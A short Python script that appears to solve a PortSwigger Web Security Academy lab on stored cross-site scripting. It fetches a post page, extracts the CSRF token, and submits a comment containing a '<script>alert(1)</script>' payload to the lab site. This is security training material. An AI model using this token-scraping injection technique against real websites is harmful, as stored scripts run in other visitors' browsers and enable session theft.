#https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
from utils import *

url="https://0a10002904fdf25d8246ca1200ab005d.web-security-academy.net/post?postId=4"

session=requests.Session()
response=session.get(url)
soup=parse_html(response)
token = soup.find('input', {'name': 'csrf'})["value"]

data={
    "csrf":token,
    "postId":4,
    "comment":"<script>alert(1)</script>",
    "name":"qsdqsd",
    "email":"qsdqsd@gmail.com",
   "website":"https://www.qsdqsd.com"
}
url="https://0a10002904fdf25d8246ca1200ab005d.web-security-academy.net/post/comment"
response=session.post(url,data=data)
print(check_succes(parse_html(response)))
